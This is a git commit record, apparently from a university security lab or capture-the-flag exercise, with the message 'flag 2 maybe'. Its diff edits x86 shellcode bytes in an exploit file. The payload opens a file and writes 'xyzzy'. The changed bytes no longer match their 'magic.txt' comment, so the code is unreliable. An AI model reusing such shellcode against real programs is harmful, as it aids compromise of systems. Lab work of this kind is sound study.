48d51042188eee36086d69bba9dd25d45dae201e
malique-bodie <malique_bodie@brown.edu>
2021-10-28 00:49:31 -0400

    flag 2 maybe

--- exp2.c
+++ exp2.c
@@ -25,10 +25,10 @@ unsigned char payload[] =
 	/* ------------------------------------	*/
 	/* FIXME */
 	/* ------------------------------------	*/
-   "\x68" "\x74\x78\x74\x2e"		// push "magic.txt"
-   "\x68" "\x63\x69\x67\x61"
-   "\x6a\x6d"
-
+   "\x68\x6E\x2F\x22\x74"	// push "magic.txt"
+   "\x68\x78\x74\x2E\x63"
+   "\x68\x69\x67\x61\x6D"
+   "\x6A\x22"
    "\x89\xe3"               	//mov    %esp,%ebx
    "\x6a\x01"                	//push   $0x1
    "\x59"                   	//pop    %ecx
@@ -36,10 +36,12 @@ unsigned char payload[] =
    "\x6a\x05"                	//push   $0x5
    "\x58"                   	//pop    %eax
    "\xcd\x80"                	//int    $0x80
+
+
    "\x89\xc3"               	//mov    %eax,%ebx
    "\x68" "\x79\x7a\x7a\x79"	// push "xyzzy"
    "\x6a\x78"
-   "\x89\xe1"              	//mov    %esp,%ecx
+   "\x89\xe1"              		//mov    %esp,%ecx
    "\x6a\x05"               	//push   $0x5
    "\x5a"                   	//pop    %edx
    "\x6a\x05"               	//push   $0x5
